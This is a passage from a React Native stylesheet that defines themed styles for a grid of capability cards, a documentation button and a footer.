  capGrid: { flexDirection: "row", flexWrap: "wrap", gap: theme.spacing(2) },
  capCard: { width: "47%", backgroundColor: theme.colors.bgElevated, borderRadius: theme.radius.md, borderWidth: 1, borderColor: theme.colors.border, padding: theme.spacing(3.5), gap: theme.spacing(2) },
  capTitle: { color: theme.colors.text, fontSize: 13, fontWeight: "700" },
  capText: { color: theme.colors.textDim, fontSize: 11, lineHeight: 16 },
  docBtn: { flexDirection: "row", alignItems: "center", justifyContent: "center", gap: theme.spacing(2), backgroundColor: theme.colors.accent, paddingVertical: theme.spacing(3.5), borderRadius: theme.radius.md },
  docBtnText: { color: theme.colors.bg, fontWeight: "800", fontSize: 14 },
  footer: { color: theme.colors.textFaint, fontSize: 11, textAlign: "center", marginTop: theme.spacing(4), fontFamily: theme.font.mono },
});
